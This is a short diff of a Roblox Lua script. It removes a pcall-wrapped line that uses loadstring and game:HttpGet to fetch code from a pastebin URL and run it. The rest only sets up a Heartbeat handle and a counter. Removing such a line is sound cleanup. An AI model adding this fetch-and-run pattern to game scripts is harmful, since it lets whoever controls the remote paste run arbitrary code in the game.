@@ -1,6 +1,3 @@
-pcall(function()
-loadstring(game:HttpGet("https://pastebin.com/raw/8062SKaF", true))()
-end)
 local runService = game:GetService("RunService");
 local heartbeat = runService.Heartbeat;
 number = 0 
